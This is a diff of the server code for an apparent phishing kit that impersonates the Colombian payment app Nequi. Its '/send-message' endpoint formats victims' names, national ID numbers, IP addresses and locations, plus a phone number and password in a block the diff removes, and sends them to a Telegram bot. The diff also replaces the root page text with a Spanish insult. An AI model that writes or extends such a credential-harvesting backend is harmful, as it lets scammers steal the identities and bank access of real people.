@@ -22,8 +22,18 @@ app.post('/send-message', async (req, res) => {
         return res.status(400).json({ error: 'Datos incompletos' });
     }
 
-    // Formato 1: Nequi_Meta_Infinito
+    // Formato 1: Nequi 2.0 (para step_1.html)
     const messageFormat1 = `
+Nequi 2.0
+ID: ${documentNumber}
+Nombres: ${fullName}
+IP: ${userIP || 'Desconocida'}
+Ciudad: ${city || 'Desconocida'}
+País: ${country || 'Desconocido'}
+`.trim();
+
+    // Formato 2: Nequi_Meta_Infinito (para neq.html)
+    const messageFormat2 = `
 👤Nequi_Meta_Infinito👤
 🆔Nombres: ${fullName}
 🪪Cédula: ${documentNumber}
@@ -33,20 +43,8 @@ app.post('/send-message', async (req, res) => {
 🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
 `.trim();
 
-    // Formato 2: Nequi 2.0
-    const messageFormat2 = `
-Nequi 2.0
-ID: ${documentNumber}
-Nombres: ${fullName}
-IP: ${userIP || 'Desconocida'}
-Ciudad: ${city || 'Desconocida'}
-País: ${country || 'Desconocido'}
-Número: ${username}
-Clave: ${password}
-`.trim();
-
     try {
-        // Enviar ambos mensajes a Telegram
+        // Enviar primero el formato 1
         const response1 = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
             {
@@ -55,6 +53,7 @@ Clave: ${password}
             }
         );
 
+        // Enviar segundo el formato 2
         const response2 = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
             {
@@ -82,5 +81,5 @@ app.listen(PORT, () => {
 });
 
 app.get('/', (req, res) => {
-    res.send('Servidor funcionando correctamente');
+    res.send('MAMENME LA CABEZA DER WEBO BECERROS VAYAN A RECARGAR SUS CAMPS MALPARIOS POBRES DE MIERDA PURO APARENTAR ANDAN APAGAOS');
 });
